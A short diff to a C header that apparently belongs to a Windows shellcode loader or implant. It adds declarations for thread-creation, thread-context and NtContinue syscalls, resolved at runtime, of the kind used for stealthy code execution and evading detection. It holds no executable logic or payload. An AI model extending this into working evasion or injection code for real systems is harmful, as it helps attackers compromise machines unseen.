@@ -3,6 +3,8 @@
 #include <windows.h>
 #include <winhttp.h>
 
+#include "ntdll.h"
+
 #include "Macros.h"
 
 typedef struct _SYS_INFO {
@@ -33,7 +35,11 @@ typedef struct _INSTANCE
         D_API(LocalAlloc);
         D_API(LocalReAlloc);
         D_API(LocalFree);
+        D_API(RtlCaptureContext);
 
+        void* RtlUserThreadStart;
+        void* RtlExitUserThread;
+        void* VirtualFree;
         void* LoadLibraryA;
 
     } Win32;
@@ -53,6 +59,12 @@ typedef struct _INSTANCE
     {
         SYS_INFO NtAllocateVirtualMemory;
         SYS_INFO NtProtectVirtualMemory;
+        SYS_INFO NtCreateThreadEx;
+        SYS_INFO NtGetContextThread;
+        SYS_INFO NtSetContextThread;
+        SYS_INFO NtResumeThread;
+        SYS_INFO NtContinue;
+
     } Sys;
 
 } INSTANCE, *PINSTANCE;
